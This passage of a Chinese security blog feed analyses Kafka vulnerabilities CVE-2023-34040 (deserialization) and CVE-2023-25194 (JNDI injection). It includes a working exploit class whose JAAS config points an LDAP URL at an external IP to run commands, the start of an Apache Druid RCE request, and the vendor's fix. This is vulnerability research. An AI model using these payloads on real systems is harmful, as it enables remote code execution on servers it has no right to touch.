class="line">ConcurrentKafkaListenerContainerFactory&lt;String, Greeting&gt; factory = <span class="keyword">new</span> <span class="title class_">ConcurrentKafkaListenerContainerFactory</span>&lt;&gt;();  </span><br><span class="line">factory.getContainerProperties().setCheckDeserExWhenValueNull(<span class="literal">true</span>);  </span><br><span class="line">factory.getContainerProperties().setCheckDeserExWhenKeyNull(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>payload 参考 <a class="link" href="https://github.com/Contrast-Security-OSS/Spring-Kafka-POC-CVE-2023-34040">https://github.com/Contrast-Security-OSS/Spring-Kafka-POC-CVE-2023-34040<i class="fas fa-external-link-alt"></i></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>主要是来看反序列化的部分</p><p>断点会先走到 <code>org.springframework.kafka.listener.ListenerUtils#getExceptionFromHeader</code> 方法，它这里面会获取到 PoC 中的 <code>KEY_DESERIALIZER_EXCEPTION_HEADER</code>，并将其作为 headers</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/key.png" class><p>往下跟进 <code>byteArrayToDeserializationException()</code> 方法，这里就直接到反序列化的部分了，而在反序列化之前做了一次 <code>resolveClass()</code> 的校验。</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/resolveClass.png" class><p>而这里的 <code>resolveClass()</code> 校验是一次性的，这就代表我们可以构造其他的 Payload，如 CC 链等，证实是可以打通的</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/readObject.png" class><p>之后便会进入到对应类的 <code>readObject()</code> 方法</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a class="link" href="https://github.com/spring-projects/spring-kafka/commit/25ac793a78725e2ca4a3a2888a1506a4bfcf0c9d">https://github.com/spring-projects/spring-kafka/commit/25ac793a78725e2ca4a3a2888a1506a4bfcf0c9d<i class="fas fa-external-link-alt"></i></a></p><p>相当于把这里的 header 头加黑了</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/blackHeader.png" class>]]></content>
    
    
    <summary type="html">CVE-2023-34040 漏洞分析</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-25194 Kafka Jndi 注入</title>
    <link href="https://drun1baby.github.io/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/"/>
    <id>https://drun1baby.github.io/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/</id>
    <published>2023-11-27T01:47:37.000Z</published>
    <updated>2023-11-27T01:53:33.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-25194-Kafka-Jndi-注入"><a href="#CVE-2023-25194-Kafka-Jndi-注入" class="headerlink" title="CVE-2023-25194 Kafka Jndi 注入"></a>CVE-2023-25194 Kafka Jndi 注入</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>漏洞通告地址：<a class="link" href="https://kafka.apache.org/cve-list.html">https://kafka.apache.org/cve-list.html<i class="fas fa-external-link-alt"></i></a></p><p>需要看的漏洞列表：</p><ul><li>CVE-2022-23305（SQL 注入，后面发现还是 log4j 的问题）</li><li>CVE-2023-25194（JNDI 注入 <a class="link" href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20Kafka%20Clients%20LDAP%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2023-25194.md%EF%BC%89">https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20Kafka%20Clients%20LDAP%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2023-25194.md）<i class="fas fa-external-link-alt"></i></a></li><li>CVE-2023-34040（反序列化攻击）</li></ul><p>主要是这三个漏洞，其余的一些 CVE-2021 或是 CVE-2022 很多都是受到 log4j 组件的影响</p><h1 id="CVE-2023-25194-JNDI-注入分析"><a href="#CVE-2023-25194-JNDI-注入分析" class="headerlink" title="CVE-2023-25194 JNDI 注入分析"></a>CVE-2023-25194 JNDI 注入分析</h1><h2 id="Apache-Kafka-Clients-Jndi-Injection"><a href="#Apache-Kafka-Clients-Jndi-Injection" class="headerlink" title="Apache Kafka Clients Jndi Injection"></a>Apache Kafka Clients Jndi Injection</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Kafka 是一个分布式数据流处理平台，可以实时发布、订阅、存储和处理数据流。Kafka Connect 是一种用于在 kafka 和其他系统之间可扩展、可靠的流式传输数据的工具。攻击者可以利用基于 SASL JAAS 配置和 SASL 协议的任意 Kafka 客户端，对 Kafka Connect worker 创建或修改连接器时，通过构造特殊的配置，进行 JNDI 注入来实现远程代码执行。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>2.4.0 &lt;&#x3D; Apache Kafka &lt;&#x3D; 3.3.2</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="Kafka-是什么"><a href="#Kafka-是什么" class="headerlink" title="Kafka 是什么"></a>Kafka 是什么</h4><p>Kafka 是一个开源的分布式消息系统，Kafka 可以处理大量的消息和数据流，具有高吞吐量、低延迟、可扩展性等特点。它被广泛应用于大数据领域，如日志收集、数据传输、流处理等场景。</p><p>感觉上和 RocketMQ 很类似，主要功能都是用来进行数据传输的。</p><h4 id="Kafka-客户端-SASL-JAAS-配置"><a href="#Kafka-客户端-SASL-JAAS-配置" class="headerlink" title="Kafka 客户端 SASL JAAS 配置"></a>Kafka 客户端 SASL JAAS 配置</h4><p>简单认证与安全层 (SASL, Simple Authentication and Security Layer ) 是一个在网络协议中用来认证和数据加密的构架，在 Kafka 的实际应用当中表现为 JAAS。</p><p>Java 认证和授权服务（Java Authentication and Authorization Service，简称 JAAS）是一个 Java 以用户为中心的安全框架，作为 Java 以代码为中心的安全的补充。总结一下就是用于认证。有趣的是 <strong>Shiro (JSecurity)</strong> 最初被开发出来的原因就是由于当时 JAAS 存在着许多缺点</p><p>参考自 <a class="link" href="https://blog.csdn.net/yinxuep/article/details/103242969">https://blog.csdn.net/yinxuep/article/details/103242969<i class="fas fa-external-link-alt"></i></a> 还有一些细微的配置这里不再展开。动态设置和静态修改 <code>.conf</code> 文件实际上效果是一致的。</p><h5 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h5><p>1、通常在服务器节点下配置服务器 JASS 文件，例如这里我们将其命名为 <code>kafka_server_jaas.conf</code>，内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KafkaServer &#123;</span><br><span class="line">    org.apache.kafka.common.security.plain.PlainLoginModule required</span><br><span class="line">    username=&quot;eystar&quot;</span><br><span class="line">    password=&quot;eystar8888&quot;</span><br><span class="line">    user_eystar=&quot;eystar8888&quot;</span><br><span class="line">    user_yxp=&quot;yxp-secret&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>说明：</strong></p><p>username +password 表示 kafka 集群环境各个代理之间进行通信时使用的身份验证信息。</p><p><code>user_eystar=&quot;eystar8888&quot;</code> 表示定义客户端连接到代理的用户信息，即创建一个用户名为 eystar，密码为 eystar8888 的用户身份信息，kafka 代理对其进行身份验证，可以创建多个用户，格式 <code>user_XXX=”XXX”</code></p><p>2、如果处于静态使用中，需要将其加入到 JVM 启动参数中，如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;x<span class="variable">$KAFKA_OPTS</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">export</span> KAFKA_OPTS=<span class="string">&quot;-Djava.security.auth.login.config=/opt/modules/kafka_2.11-2.0.0/config/kafka_server_jaas.conf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p><a class="link" href="https://kafka.apache.org/documentation/#brokerconfigs_sasl.jaas.config">https://kafka.apache.org/documentation/#brokerconfigs_sasl.jaas.config<i class="fas fa-external-link-alt"></i></a></p><h5 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h5><p>基本同服务端一致，如下步骤</p><p>1、配置客户端 JAAS 文件，命名为 <code>kafka_client_jaas.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">KafkaClient &#123;</span><br><span class="line">        org.apache.kafka.common.security.plain.PlainLoginModule required</span><br><span class="line">        username=&quot;eystar&quot;</span><br><span class="line">        password=&quot;eystar8888&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>2、JAVA 调用的 Kafka Client 客户端连接时指定配置属性 <code>sasl.jaas.config</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \</span><br><span class="line">    username=<span class="string">&quot;eystar&quot;</span> \</span><br><span class="line">password=<span class="string">&quot;eystar8888&quot;</span>;</span><br><span class="line"><span class="comment">// 即配置属性：（后续会讲到也能够动态配置，让我想起了 RocketMQ）</span></span><br><span class="line">Pro.set(“sasl.jaas.config”,”org.apache.kafka.common.security.plain.PlainLoginModule required username=\<span class="string">&quot;eystar\&quot; password=\&quot;eystar8888\&quot;;&quot;</span>;</span><br><span class="line">”);</span><br></pre></td></tr></table></figure><h4 id="Kafka-客户端动态修改-JAAS-配置"><a href="#Kafka-客户端动态修改-JAAS-配置" class="headerlink" title="Kafka 客户端动态修改 JAAS 配置"></a>Kafka 客户端动态修改 JAAS 配置</h4><p>方式一：配置 Properties 属性，可以注意到这一个字段的键名为 <code>sasl.jaas.config</code>，它的格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loginModuleClass controlFlag (optionName=optionValue)*;</span><br></pre></td></tr></table></figure><p>其中的 loginModuleClass 代表认证方式, 例如 LDAP, Kerberos, Unix 认证，可以参考官方文档 <a class="link" href="https://docs.oracle.com/javase/8/docs/technotes/guides/security/jgss/tutorials/LoginConfigFile.html">https://docs.oracle.com/javase/8/docs/technotes/guides/security/jgss/tutorials/LoginConfigFile.html<i class="fas fa-external-link-alt"></i></a> 其中有一处为 <code>JndiLoginModule</code>，JDK 自带的 loginModule 位于 <code>com.sun.security.auth.module</code></p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/module.png" class><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//安全模式 用户名 密码</span></span><br><span class="line">props.setProperty(<span class="string">&quot;sasl.jaas.config&quot;</span>, <span class="string">&quot;org.apache.kafka.common.security.plain.PlainLoginModule required username=\&quot;usn\&quot; password=\&quot;pwd\&quot;;&quot;</span>);</span><br><span class="line">props.setProperty(<span class="string">&quot;security.protocol&quot;</span>, <span class="string">&quot;SASL_PLAINTEXT&quot;</span>);</span><br><span class="line">props.setProperty(<span class="string">&quot;sasl.mechanism&quot;</span>, <span class="string">&quot;PLAIN&quot;</span>);</span><br></pre></td></tr></table></figure><p>方式二：设置系统属性参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 指定kafka_client_jaas.conf文件路径 </span></span><br><span class="line"><span class="type">String</span> <span class="variable">confPath</span> <span class="operator">=</span> TestKafkaComsumer.class.getResource(<span class="string">&quot;/&quot;</span>).getPath()+ <span class="string">&quot;/kafka_client_jaas.conf&quot;</span>; </span><br><span class="line">System.setProperty(<span class="string">&quot;java.security.auth.login.config&quot;</span>, confPath);</span><br></pre></td></tr></table></figure><h4 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h4><p><strong>消费者</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestComsumer</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        props.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;192.168.1.176:9092&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;group.id&quot;</span>, <span class="string">&quot;test_group&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;enable.auto.commit&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;auto.commit.interval.ms&quot;</span>, <span class="string">&quot;1000&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;key.deserializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;value.deserializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        <span class="comment">// sasl.jaas.config的配置</span></span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.jaas.config&quot;</span>, <span class="string">&quot;org.apache.kafka.common.security.plain.PlainLoginModule required username=\&quot;usn\&quot; password=\&quot;pwd\&quot;;&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;security.protocol&quot;</span>, <span class="string">&quot;SASL_PLAINTEXT&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.mechanism&quot;</span>, <span class="string">&quot;PLAIN&quot;</span>);</span><br><span class="line"></span><br><span class="line">        KafkaConsumer&lt;String, String&gt; consumer = <span class="keyword">new</span> <span class="title class_">KafkaConsumer</span>&lt;&gt;(props);</span><br><span class="line">        consumer.subscribe(Arrays.asList(<span class="string">&quot;topic_name&quot;</span>));</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">                ConsumerRecords&lt;String, String&gt; records = consumer.poll(Duration</span><br><span class="line">                        .ofMillis(<span class="number">100</span>));</span><br><span class="line">                <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; record : records)</span><br><span class="line">                    System.out.printf(<span class="string">&quot;offset = %d, partition = %d, key = %s, value = %s%n&quot;</span>,</span><br><span class="line">                            record.offset(), record.partition(), record.key(), record.value());</span><br><span class="line">          </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>生产者</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProduce</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">        props.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;192.168.1.176:9092&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;acks&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;retries&quot;</span>, <span class="number">3</span>);</span><br><span class="line">        props.put(<span class="string">&quot;batch.size&quot;</span>, <span class="number">16384</span>);</span><br><span class="line">        props.put(<span class="string">&quot;buffer.memory&quot;</span>, <span class="number">33554432</span>);</span><br><span class="line">        props.put(<span class="string">&quot;linger.ms&quot;</span>, <span class="number">10</span>);</span><br><span class="line">        props.put(<span class="string">&quot;key.serializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;value.serializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//sasl</span></span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.jaas.config&quot;</span>, <span class="string">&quot;org.apache.kafka.common.security.plain.PlainLoginModule required username=\&quot;usn\&quot; password=\&quot;pwd\&quot;;&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;security.protocol&quot;</span>, <span class="string">&quot;SASL_PLAINTEXT&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.mechanism&quot;</span>, <span class="string">&quot;PLAIN&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;&gt;(props);</span><br><span class="line">        </span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * ProducerRecord 参数解析 第一个：topic_name为生产者 topic名称,</span></span><br><span class="line"><span class="comment">        * 第二个：对于生产者kafka2.0需要你指定一个key</span></span><br><span class="line"><span class="comment">        * ,在企业应用中，我们一般会把他当做businessId来用，比如订单ID,用户ID等等。 第三个：消息的主要信息</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">              producer.send(<span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;String, String&gt;(<span class="string">&quot;topic_name&quot;</span>, Integer.toString(i), <span class="string">&quot;message info&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞触发点其实是在 <code>com.sun.security.auth.module.JndiLoginModule#attemptAuthentication</code> 方法处</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/lookup.png" class><p>理顺逻辑很容易构造出 EXP</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.kafka.clients.consumer.KafkaConsumer;</span><br><span class="line">import org.apache.kafka.clients.producer.KafkaProducer;</span><br><span class="line"></span><br><span class="line">import java.util.Properties;</span><br><span class="line"></span><br><span class="line">public class EXP &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Properties properties = new Properties();</span><br><span class="line">        properties.put(&quot;bootstrap.servers&quot;, &quot;127.0.0.1:1234&quot;);</span><br><span class="line">        properties.put(&quot;key.deserializer&quot;, &quot;org.apache.kafka.common.serialization.StringDeserializer&quot;);</span><br><span class="line">        properties.put(&quot;value.deserializer&quot;,&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;);</span><br><span class="line"></span><br><span class="line">        properties.put(&quot;sasl.mechanism&quot;, &quot;PLAIN&quot;);</span><br><span class="line">        properties.put(&quot;security.protocol&quot;, &quot;SASL_SSL&quot;);</span><br><span class="line">        properties.put(&quot;sasl.jaas.config&quot;, &quot;com.sun.security.auth.module.JndiLoginModule &quot; +</span><br><span class="line">                &quot;required &quot; +</span><br><span class="line">                &quot;user.provider.url=\&quot;ldap://124.222.21.138:1389/Basic/Command/Base64/Q2FsYw==\&quot; &quot; +</span><br><span class="line">                &quot;useFirstPass=\&quot;true\&quot; &quot; +</span><br><span class="line">                &quot;group.provider.url=\&quot;xxx\&quot;;&quot;);</span><br><span class="line"></span><br><span class="line">        KafkaConsumer&lt;String, String&gt; kafkaConsumer = new KafkaConsumer&lt;&gt;(properties);</span><br><span class="line">        kafkaConsumer.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/EXP.png" class><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>前面有非常多的数据处理与赋值，这里就跳过了，直接看 <code>org.apache.kafka.clients.consumer.KafkaConsumer</code> 类的第 177 行 <code>ClientUtils.createChannelBuilder()</code>，跟进。</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/createChannelBuilder.png" class><p>继续跟进，这里会先判断 SASL 模式是否开启，只有开启了才会往下跟进到 <code>create()</code> 方法</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/SASL_SSL.png" class><p>跟进 <code>create()</code> 方法，做完客户端的判断和安全协议的判断之后，调用了 <code>loadClientContext()</code> 方法，跟进，发现其中还是加载了一些配置。</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/loadClientContext.png" class><p>跳出来，跟进 <code>((ChannelBuilder)channelBuilder).configure(configs)</code> 方法，最后跟到 <code>org.apache.kafka.common.security.authenticator.LoginManager</code> 的构造函数。</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/LoginManager.png" class><p>跟进 <code>login()</code> 方法，此处 <code>new LoginContext()</code>，随后调用 <code>login()</code> 方法，跟进</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/loginContext.png" class><p>这里会调用 <code>JndiLoginModule</code> 的 <code>initialize()</code> 方法</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/moduleStack.png" class><p>初始化完成之后，此处调用 <code>JndiLoginModule</code> 的 <code>login()</code> 方法，最后到 <code>JndiLoginModule</code> 的 <code>attemptAuthentication()</code> 方法，完成 Jndi 注入。</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/down.png" class><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在 3.4.0 版本中, 官方的修复方式是增加了对 <code>JndiLoginModule</code> 的黑名单</p><p><code>org.apache.kafka.common.security.JaasContext#throwIfLoginModuleIsNotAllowed</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">throwIfLoginModuleIsNotAllowed</span><span class="params">(AppConfigurationEntry appConfigurationEntry)</span> &#123;</span><br><span class="line">    Set&lt;String&gt; disallowedLoginModuleList = (Set)Arrays.stream(System.getProperty(<span class="string">&quot;org.apache.kafka.disallowed.login.modules&quot;</span>, <span class="string">&quot;com.sun.security.auth.module.JndiLoginModule&quot;</span>).split(<span class="string">&quot;,&quot;</span>)).map(String::trim).collect(Collectors.toSet());</span><br><span class="line">    <span class="type">String</span> <span class="variable">loginModuleName</span> <span class="operator">=</span> appConfigurationEntry.getLoginModuleName().trim();</span><br><span class="line">    <span class="keyword">if</span> (disallowedLoginModuleList.contains(loginModuleName)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(loginModuleName + <span class="string">&quot; is not allowed. Update System property &#x27;&quot;</span> + <span class="string">&quot;org.apache.kafka.disallowed.login.modules&quot;</span> + <span class="string">&quot;&#x27; to allow &quot;</span> + loginModuleName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Apache-Druid-RCE-via-Kafka-Clients"><a href="#Apache-Druid-RCE-via-Kafka-Clients" class="headerlink" title="Apache Druid RCE via Kafka Clients"></a>Apache Druid RCE via Kafka Clients</h2><p>影响版本：Apache Druid &lt;&#x3D; 25.0.0</p><p>Apache Druid 是一个实时分析型数据库, 它支持从 Kafka 中导入数据 (Consumer) , 因为目前最新版本的 Apache Druid 25.0.0 所用 <code>kafka-clients</code> 依赖的版本仍然是 3.3.1, 即存在漏洞的版本, 所以如果目标 Druid 存在未授权访问 (默认配置无身份认证), 则可以通过这种方式实现 RCE</p><p>有意思的是, Druid 包含了 <code>commons-beanutils:1.9.4</code> 依赖, 所以即使在高版本 JDK 的情况下也能通过 LDAP JNDI 打反序列化 payload 实现 RCE</p><ul><li>漏洞 UI 处触发点：Druid Web Console - Load data - Apache Kafka</li></ul><p>在这里可以加载 Kafka 的 Data，其中可以修改配置项 <code>sasl.jaas.config</code>，由此构造 Payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://124.222.21.138:8888/druid/indexer/v1/sampler?for=connect</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.21.138:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>916</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span 